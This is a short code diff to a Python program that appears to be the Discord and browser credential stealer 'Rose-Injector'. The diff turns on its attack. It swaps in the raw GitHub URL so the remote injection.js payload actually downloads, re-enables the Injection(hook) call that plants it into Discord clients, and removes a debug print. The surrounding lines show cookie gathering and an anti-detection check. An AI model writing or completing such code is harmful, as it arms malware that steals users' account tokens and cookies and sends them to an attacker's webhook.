@@ -62,7 +62,6 @@ debug_mode = cc.get_debug_mode()
 footer = cc.get_footer()
 avatar = cc.get_avatar()
 color = cc.get_color()
-print(hook)
 
 
 local = os.getenv("LOCALAPPDATA")
@@ -129,7 +128,7 @@ class Injection:
             self.appdata + '\\DiscordPTB',
             self.appdata + '\\DiscordDevelopment'
         ]
-        self.code = requests.get('https://github.com/DamagingRose/Rose-Injector/blob/main/injection/injection.js').text
+        self.code = requests.get('https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/injection/injection.js').text
 
         for proc in psutil.process_iter():
             if 'discord' in proc.name().lower():
@@ -956,7 +955,7 @@ OtherZip = []
 
 GatherAll()
 #RobloxCookie()
-#Injection(hook)
+Injection(hook)
 DETECTED = Trust(Cookies)
 DETECTED = False
 if not DETECTED:
